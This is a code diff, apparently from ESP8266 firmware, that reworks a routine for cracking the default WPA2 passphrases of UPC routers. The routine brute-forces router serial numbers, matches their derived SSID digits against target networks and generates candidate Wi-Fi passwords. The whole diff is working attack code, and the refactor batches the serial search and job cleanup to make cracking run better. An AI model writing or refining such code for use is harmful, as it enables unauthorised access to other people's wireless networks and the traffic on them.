@@ -49,7 +49,7 @@ static size_t jobs_running = 0;
 static size_t jobs_finished = 0;
 
 // running counter used by cracking logic
-static uint64_t sum;
+static uint64_t sum = 0;
 
 #ifdef MODE_HEADLESS
 #define printf(...)
@@ -603,75 +603,36 @@ void serial2pass(char* serial, char* pass){
 const char *prefix[TESTED_PREFIXES] = {"SAAP", "SAPP", "SBAP"};
 #define PASSWORD_SIZE 8
 
-#define PRESSURE 4200
-
 __attribute__((optimize("Ofast")))
 ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
     if(jobs_running){
-        system_soft_wdt_feed();
-        for(size_t p = 0; p < PRESSURE; p++){
-            // inline upc_generate_ssid
-            const uint32_t essid_digits = (sum - (((sum * MAGIC2) >> 54) - (sum >> 31)) * 10000000);
-            if(++buf[2] == MAX2+1){
-                buf[2] = 0;
-                if(++buf[1] == (MAX1+1)){
-                    buf[1] = 0;
-                    printf("Cracking %u target(s)... %u/%u\n", jobs_running, buf[0], MAX0);
-                    if(++buf[0] == (MAX0+1)){
-                        buf[0] = 0;
-                    }
-                }
-                sum = buf[0] * 2500000 + buf[1] * 6800 + MAGIC_24GHZ;
-            } else {
-                sum++;
-            }
+        // local loop copy of sum
+        uint64_t lsum = sum;
 
+        // Fetch list of jobs to process
+        crack_job_t jobs[MAX_CRACK_JOBS];
+        size_t jobs_to_check = jobs_running;
+        for(size_t jobs_idx = 0; jobs_idx < jobs_to_check; jobs_idx++){
+            memcpy(&jobs[jobs_idx], jobs_running_queue[jobs_idx], sizeof(crack_job_t));
+        }
+
+        // Check serials
+        for(buf[2] = 0; buf[2] < MAX2+1; buf[2]++, lsum++){
+            const uint32_t essid_digits = (lsum - (((lsum * MAGIC2) >> 54) - (lsum >> 31)) * 10000000);
             // check results
-            for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
-                crack_job_t * restrict job = jobs_running_queue[jobs_idx];
-
-                if(!job){
-                    continue;
-                }
-
-                if(job->start_sum == sum){
-                    /*printf("Finished generating passwords for target UPC%07d\n", job->target);*/
-                    job->finished_cracking = true;
-                    move_job_to_finished_queue(job);
-                    jobs_idx = 0;
-                    continue;
-                }
-
-                if(essid_digits == job->target){
-
+            for(size_t jobs_idx = 0; jobs_idx < jobs_to_check; jobs_idx++){
+                if(essid_digits == jobs[jobs_idx].target){
+                    // Get a reference to the queue (not the copy) and update it
+                    crack_job_t * restrict job = jobs_running_queue[jobs_idx];
                     const size_t required_size = PASSWORD_SIZE*(job->passwords_found+TESTED_PREFIXES);
                     job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
                     memset(job->candidate_passwords+(job->passwords_found*PASSWORD_SIZE), 0, TESTED_PREFIXES*PASSWORD_SIZE);
 
-                    // roll back state
-                    uint32_t old_buf[3];
-                    memcpy(old_buf, buf, sizeof(old_buf));
-                    if(buf[2] == 0){
-                        old_buf[2] = MAX2;
-                        if(buf[1] == 0){
-                            old_buf[1] = MAX1;
-                            if(buf[0] == 0){
-                                old_buf[0] = MAX0;
-                            } else {
-                                old_buf[0] = buf[0]-1;
-                            }
-                        } else {
-                            old_buf[1] = buf[1]-1;
-                        }
-                    } else {
-                        old_buf[2] = buf[2]-1;
-                    }
-
                     for(size_t prefix_idx = 0; prefix_idx < TESTED_PREFIXES; prefix_idx++){
                         char serial[13] = {0};
                         char * pass = job->candidate_passwords+(PASSWORD_SIZE*(job->passwords_found));
-                        os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], old_buf[0], old_buf[1], old_buf[2]);
+                        os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], buf[0], buf[1], buf[2]);
                         serial2pass(serial, pass);
                         //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
                         job->passwords_found++;
@@ -679,6 +640,30 @@ static void crack(os_event_t *events){
                 }
             }
         }
+
+        // Count to next block of serials
+        if(++buf[1] == (MAX1+1)){
+            buf[1] = 0;
+            printf("Cracking %u target(s)... %u/%u\n", jobs_running, buf[0], MAX0);
+            if(++buf[0] == (MAX0+1)){
+                buf[0] = 0;
+            }
+        }
+
+        // inline upc_generate_ssid
+        sum = buf[0] * 2500000 + buf[1] * 6800 + MAGIC_24GHZ;
+
+        // Clean up finished jobs
+        for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
+            crack_job_t * restrict job = jobs_running_queue[jobs_idx];
+            if(job && job->start_sum == sum){
+                /*printf("Finished generating passwords for target UPC%07d\n", job->target);*/
+                job->finished_cracking = true;
+                move_job_to_finished_queue(job);
+            }
+        }
+
+        // Queue next task
         system_os_post(PRIO_CRACK, 0, 0);
     }
 }
